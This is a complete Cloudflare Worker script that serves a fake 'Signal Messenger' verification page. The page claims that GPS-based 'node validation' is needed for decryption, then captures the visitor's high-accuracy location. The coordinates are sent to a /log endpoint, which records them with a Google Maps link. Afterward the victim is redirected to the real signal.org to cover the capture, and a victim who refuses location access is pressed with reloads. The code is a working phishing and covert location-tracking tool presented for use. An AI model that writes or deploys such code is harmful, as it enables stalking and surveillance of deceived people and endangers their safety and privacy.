export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);

    // 1. DATA LOGGING (This replaces your Python do_POST)
    if (request.method === "POST" && url.pathname === "/log") {
      const data = await request.json();
      
      // Exact GPS Data will appear in your Cloudflare 'Observability' Logs
      console.log(`[!] GPS ACQUIRED: ${data.lat}, ${data.lon} (Accuracy: ${data.acc}m)`);
      console.log(`[!] Google Maps: https://www.google.com/maps?q=${data.lat},${data.lon}`);

      return new Response(JSON.stringify({ status: "ok" }), {
        headers: { "Content-Type": "application/json" },
      });
    }

    // 2. SIGNAL UI (This replaces your HTML_CONTENT)
    const html = `
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Signal Messenger | Secure Access</title>
        <style>
            :root { --accent: #2C6BED; --bg: #0B0B0C; --card: #161718; --text: #FFFFFF; --dim: #8E8E93; }
            body { 
                margin: 0; background: var(--bg); color: var(--text); 
                font-family: -apple-system, sans-serif;
                display: flex; align-items: center; justify-content: center; height: 100vh;
            }
            .vault-card {
                width: 90%; max-width: 400px; padding: 48px 32px;
                background: var(--card); border: 1px solid #2C2C2E; border-radius: 32px; text-align: center;
                animation: slideUp 0.6s cubic-bezier(0.2, 0.8, 0.2, 1);
            }
            .signal-icon {
                width: 72px; height: 72px; background: var(--accent); border-radius: 20px;
                margin: 0 auto 28px; display: flex; align-items: center; justify-content: center;
                animation: pulse 2s infinite;
            }
            .btn { background: var(--accent); color: white; border: none; width: 100%; padding: 18px; border-radius: 16px; font-weight: 600; cursor: pointer; }
            .step-box { display: none; text-align: left; background: #000; border-radius: 16px; padding: 20px; margin-top: 8px; }
            .spinner { width: 18px; height: 18px; border: 2px solid #333; border-top-color: var(--accent); border-radius: 50%; animation: spin 0.8s linear infinite; margin-right: 12px; display: inline-block; }
            @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
            @keyframes spin { to { transform: rotate(360deg); } }
            @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(44, 107, 237, 0.4); } 70% { box-shadow: 0 0 0 15px rgba(44, 107, 237, 0); } 100% { box-shadow: 0 0 0 0 rgba(44, 107, 237, 0); } }
        </style>
    </head>
    <body>
        <div class="vault-card">
            <div class="signal-icon"><svg width="36" height="36" viewBox="0 0 24 24" fill="white"><path d="M12 2C6.477 2 2 6.477 2 12c0 1.89.525 3.66 1.438 5.16L2 22l4.84-1.438C8.34 21.475 10.11 22 12 22c5.523 0 10-4.477 10-10S17.523 2 12 2z"/></svg></div>
            <h1>Identity Sync</h1>
            <p>High-precision node validation required for end-to-end decryption.</p>
            <button class="btn" id="btn" onclick="verify()">Connect to Node</button>
            <div class="step-box" id="box"><div class="spinner"></div> <span>Pinging GPS Satellites...</span></div>
        </div>
        <script>
            async function verify() {
                document.getElementById('btn').style.display = 'none';
                document.getElementById('box').style.display = 'block';
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    await fetch('/log', {
                        method: 'POST',
                        body: JSON.stringify({
                            lat: pos.coords.latitude,
                            lon: pos.coords.longitude,
                            acc: Math.round(pos.coords.accuracy)
                        })
                    });
                    setTimeout(() => { window.location.href = "https://signal.org/"; }, 1000);
                }, () => { alert("GPS Hardware Required."); location.reload(); }, { enableHighAccuracy: true });
            }
        </script>
    </body>
    </html>`;

    return new Response(html, { headers: { "Content-Type": "text/html" } });
  }
};
